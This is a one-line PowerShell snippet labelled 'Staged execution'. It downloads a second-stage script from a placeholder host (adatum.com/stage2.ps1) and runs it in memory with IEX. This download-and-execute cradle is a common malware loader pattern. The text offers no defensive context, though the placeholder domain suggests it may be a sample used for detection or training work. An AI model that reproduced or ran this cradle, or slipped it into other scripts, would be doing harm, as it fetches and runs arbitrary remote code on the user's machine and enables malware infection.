
<# Staged execution #> $DownloadUrl = "http://adatum.com/stage2.ps1"; $ScriptText = (New-Object System.Net.WebClient).DownloadString($DownloadUrl); IEX $ScriptText; Set-Location -Path $env:TEMP
